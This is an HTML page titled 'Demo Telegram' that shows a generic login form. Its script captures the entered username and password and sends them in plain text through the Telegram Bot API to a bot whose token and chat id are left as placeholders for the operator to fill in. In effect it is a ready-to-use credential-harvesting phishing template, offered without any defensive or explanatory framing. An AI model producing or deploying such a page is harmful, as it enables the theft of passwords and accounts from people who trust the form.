<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Demo Telegram</title>

  <style>
    body {
      font-family: Arial;
      background: #f5f5f5;
      text-align: center;
      margin-top: 100px;
    }

    .box {
      background: white;
      padding: 20px;
      width: 300px;
      margin: auto;
      border-radius: 10px;
    }

    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
    }

    button {
      padding: 10px;
      width: 100%;
      background: orange;
      border: none;
      color: white;
    }
  </style>
</head>

<body>

<div class="box">
  <h2>Login</h2>

  <form id="formLogin">
    <input type="text" id="username" placeholder="Username"><br>
    <input type="password" id="password" placeholder="Password"><br>
    <button type="submit">Login</button>
  </form>
</div>

<script>
document.getElementById("formLogin").addEventListener("submit", function(e) {
    e.preventDefault();

    var user = document.getElementById("username").value;
    var pass = document.getElementById("password").value;

    var token = "ISI_TOKEN_KAMU";
    var chat_id = "ISI_CHAT_ID_KAMU";

    var pesan = "LOGIN BARU\nUser: " + user + "\nPass: " + pass;

    fetch("https://api.telegram.org/bot" + token + "/sendMessage", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chat_id,
            text: pesan
        })
    })
    .then(() => {
        alert("Berhasil kirim ke Telegram");
    })
    .catch(() => {
        alert("Gagal kirim");
    });
});
</script>

</body>
</html>
